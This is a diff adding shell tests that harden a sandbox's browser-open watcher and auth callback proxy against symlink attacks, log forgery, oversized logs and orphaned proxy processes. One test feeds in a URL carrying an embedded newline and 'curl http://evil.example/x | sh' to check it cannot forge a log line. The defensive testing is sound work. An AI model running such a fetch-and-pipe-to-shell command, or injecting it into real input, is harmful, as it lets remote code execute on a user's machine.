@@ -415,3 +415,183 @@ EOF
   [ -f "$TEST_TEMP/proxy_started" ] || { echo "off mode did not start the auth proxy; cleat login would hang"; return 1; }
   [ ! -f "$TEST_TEMP/opened.log" ] || { echo "off mode opened a browser; it must suppress every open"; return 1; }
 }
+
+# ── Proxy log: the box writes into it, the host owns the file ────────────────
+# Every branch of the watcher APPENDS the claimed URL to .proxy-log, and a
+# plain `>>` follows a symlink. The clip dir is mounted read-write into the
+# box, so an unguarded log path let a caged process write lines of its choosing
+# into any file the host user can write.
+
+@test "proxy log: a symlink planted mid-session is dropped, not written through" {
+  # The clip dir is mounted rw for the whole session, so the box can plant the
+  # link at any moment. A startup-only guard never sees this one.
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  printf 'original line\n' > "$TEST_TEMP/rc-target"
+  _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
+  local wpid=$!
+  sleep 0.7
+  rm -f "$dir/.proxy-log"
+  ln -s "$TEST_TEMP/rc-target" "$dir/.proxy-log"
+  printf '%s' "https://x.example/a" > "$dir/.browser-open"
+  sleep 2
+  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
+  [ ! -L "$dir/.proxy-log" ] || { echo "the planted symlink survived"; return 1; }
+  run cat "$TEST_TEMP/rc-target"
+  assert_output "original line"
+}
+
+@test "proxy log: a symlink present at watcher start is dropped too" {
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  printf 'original line\n' > "$TEST_TEMP/rc-target2"
+  ln -s "$TEST_TEMP/rc-target2" "$dir/.proxy-log"
+  _browser_watcher "$dir" "true" "" "auto" "0" >/dev/null 2>&1 &
+  local wpid=$!
+  sleep 1
+  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
+  [ ! -L "$dir/.proxy-log" ] || { echo "planted symlink survived watcher startup"; return 1; }
+  run cat "$TEST_TEMP/rc-target2"
+  assert_output "original line"
+}
+
+@test "proxy log: a URL carrying a newline cannot forge its own log line" {
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
+  local wpid=$!
+  sleep 0.7
+  printf 'https://x.example/a\ncurl http://evil.example/x | sh' > "$dir/.browser-open"
+  local i
+  for i in 1 2 3 4 5 6 7 8 9 10; do
+    grep -q 'opening URL' "$dir/.proxy-log" 2>/dev/null && break
+    sleep 0.5
+  done
+  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
+  grep -q 'opening URL' "$dir/.proxy-log" || { echo "watcher never logged the URL"; return 1; }
+  # The payload may appear INSIDE the single log line, never as a line of its own.
+  run grep -c '^curl http' "$dir/.proxy-log"
+  assert_output "0"
+}
+
+@test "proxy log: an oversized log is capped at watcher start" {
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  head -c 1200000 /dev/zero | tr '\0' 'x' > "$dir/.proxy-log"
+  _browser_watcher "$dir" "true" "" "auto" "0" >/dev/null 2>&1 &
+  local wpid=$!
+  sleep 1
+  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
+  local sz; sz="$(wc -c < "$dir/.proxy-log" | tr -d '[:space:]')"
+  [ "$sz" -lt 1048576 ] || { echo "proxy log was never capped: $sz bytes"; return 1; }
+}
+
+# ── Callback proxy gate ──────────────────────────────────────────────────────
+
+@test "callback proxy: a deferred plain link never binds a host port" {
+  # The proxy used to start on any URL the parser accepted, so a link the
+  # policy DEFERS to the terminal still made the host bind a box-named port
+  # with no tab and nothing on screen to explain it.
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  _extract_callback_port() { echo "5555"; return 0; }
+  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; }
+  cat > "$TEST_TEMP/fake_open" <<EOF
+#!/usr/bin/env bash
+echo "\$1" >> "$TEST_TEMP/opened.log"
+EOF
+  chmod +x "$TEST_TEMP/fake_open"
+  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "auto" "1" >/dev/null 2>&1 &
+  local wpid=$!
+  sleep 0.7
+  printf '%s' "https://x.example/plain-link" > "$dir/.browser-open"
+  sleep 2
+  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
+  [ ! -f "$TEST_TEMP/proxy_started" ] || { echo "a deferred plain link bound a host port"; return 1; }
+}
+
+@test "callback proxy: a real authorize URL still starts the proxy" {
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  _extract_callback_port() { echo "5555"; return 0; }
+  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; }
+  _browser_watcher "$dir" "true" "mybox" "auto" "1" >/dev/null 2>&1 &
+  local wpid=$!
+  sleep 0.7
+  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A5555%2Fcb" > "$dir/.browser-open"
+  local i
+  for i in 1 2 3 4 5 6 7 8 9 10; do
+    [ -f "$TEST_TEMP/proxy_started" ] && break
+    sleep 0.5
+  done
+  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
+  [ -f "$TEST_TEMP/proxy_started" ] || { echo "a loopback authorize URL did not start the proxy"; return 1; }
+}
+
+# ── Callback proxy lifetime ──────────────────────────────────────────────────
+
+@test "callback proxy: a TERM takes the backend down and frees the port" {
+  # The backend used to run in the FOREGROUND of the proxy subshell, so bash
+  # deferred the trap until it exited: an abandoned login kept the loopback
+  # port bound past session end and the watcher's own wait never returned.
+  mkdir -p "$TEST_TEMP/bin"
+  cat > "$TEST_TEMP/bin/socat" <<EOF
+#!/usr/bin/env bash
+echo "\$\$" > "$TEST_TEMP/socat.pid"
+sleep 30
+EOF
+  chmod +x "$TEST_TEMP/bin/socat"
+  PATH="$TEST_TEMP/bin:$PATH" _auth_callback_proxy 45999 mybox "$TEST_TEMP/plog" &
+  local ppid=$!
+  local i
+  for i in 1 2 3 4 5 6 7 8 9 10; do
+    [ -s "$TEST_TEMP/socat.pid" ] && break
+    sleep 0.3
+  done
+  [ -s "$TEST_TEMP/socat.pid" ] || { echo "fake backend never started"; kill "$ppid" 2>/dev/null; return 1; }
+  local spid; spid="$(cat "$TEST_TEMP/socat.pid")"
+  kill -TERM "$ppid" 2>/dev/null || true
+  process_exited "$ppid" || { echo "proxy subshell survived TERM"; kill -9 "$ppid" 2>/dev/null; return 1; }
+  process_exited "$spid" || { echo "backend was orphaned and still holds the port"; kill -9 "$spid" 2>/dev/null; return 1; }
+}
+
+# ── Stale-bridge sweep (shared by startup and every teardown) ────────────────
+
+@test "bridge sweep: removes a stale bridge file" {
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  printf '%s' "https://example.com/old" > "$dir/.browser-open"
+  touch -t 202001010000 "$dir/.browser-open"
+  _browser_sweep_stale_bridge "$dir"
+  [ ! -e "$dir/.browser-open" ] || { echo "a stale bridge file survived the sweep"; return 1; }
+}
+
+@test "bridge sweep: keeps a fresh bridge file for a sibling session" {
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  printf '%s' "https://claude.ai/oauth?redirect_uri=x" > "$dir/.browser-open"
+  _browser_sweep_stale_bridge "$dir"
+  [ -f "$dir/.browser-open" ] || { echo "the sweep swallowed a live sibling login URL"; return 1; }
+}
+
+@test "bridge sweep: removes a symlink regardless of age" {
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  printf 'keep\n' > "$TEST_TEMP/sweep-target"
+  ln -s "$TEST_TEMP/sweep-target" "$dir/.browser-open"
+  _browser_sweep_stale_bridge "$dir"
+  [ ! -L "$dir/.browser-open" ] || { echo "a planted symlink survived the sweep"; return 1; }
+  [ -f "$TEST_TEMP/sweep-target" ] || { echo "the sweep followed the link and removed the target"; return 1; }
+}
+
+@test "proxy log: a real log is never dropped, only a symlink is" {
+  # Guards against an overbroad fix. Only a SYMLINK may be removed and only an
+  # OVERSIZED log capped, so a regular log must survive BOTH watcher start and
+  # a claimed URL, carrying its history forward.
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  printf 'prior session line\n' > "$dir/.proxy-log"
+  _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
+  local wpid=$!
+  sleep 0.7
+  printf '%s' "https://x.example/a" > "$dir/.browser-open"
+  local i
+  for i in 1 2 3 4 5 6 7 8 9 10; do
+    grep -q 'opening URL' "$dir/.proxy-log" 2>/dev/null && break
+    sleep 0.5
+  done
+  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
+  run cat "$dir/.proxy-log"
+  assert_output --partial "prior session line"
+  assert_output --partial "opening URL"
+}
